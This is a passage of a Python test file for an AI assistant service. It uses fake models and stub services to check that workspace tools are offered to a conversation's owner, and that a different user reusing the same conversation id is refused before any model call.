                        meta={"attachments": [], "workspace_id": workspace.workspace_id},
                    )
                )
                llm = FakeLlmPort([tool_response("list_workspace_files", {})])
                toolbox = AssistantToolBox(
                    file_service=InertFileService(),
                    conversion_service=InertConversionService(),
                    folder_repository=InertFolderRepository(),
                    storage=InertStorage(),
                    extractor=InertExtractor(),
                    models=InertModels(),
                    account_port=InertAccountPort(),
                    max_document_bytes=1024,
                    summary_max_input_chars=1000,
                    workspace_tools=harness.tools,
                )
                service = AssistantService(
                    models=_TierModels(llm),
                    toolbox=toolbox,
                    conversations=conversations,  # type: ignore[arg-type]
                    quota=FakeQuota(),  # type: ignore[arg-type]
                )

                async for _ in service.stream_chat(
                    user_id=OWNER,
                    tier=SubscriptionTier.PRO,
                    message="what is in there?",
                    conversation_id="conv-1",
                ):
                    pass

                system_text = "\n".join(
                    message.content for message in llm.calls[0][0] if message.role == "system"
                )
                assert "Analytics" in system_text

                # And the same id in someone else's conversation grants nothing:
                # the other user cannot even load the conversation, so no prompt
                # is built and no tool is offered.
                llm2 = FakeLlmPort([tool_response("list_workspace_files", {})])
                service2 = AssistantService(
                    models=_TierModels(llm2),
                    toolbox=toolbox,
                    conversations=conversations,  # type: ignore[arg-type]
                    quota=FakeQuota(),  # type: ignore[arg-type]
                )
                with pytest.raises(AssistantConversationNotFound):
                    async for _ in service2.stream_chat(
                        user_id=OTHER,
                        tier=SubscriptionTier.PRO,
                        message="what is in there?",
                        conversation_id="conv-1",
                    ):
                        pass
                assert llm2.calls == []
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


class _TierModels:
    """Resolves every tier to one scripted transport."""

    def __init__(self, port: Any) -> None:
        self._port = port

    def for_tier(self, tier: SubscriptionTier) -> Any:
        del tier
        return self._port
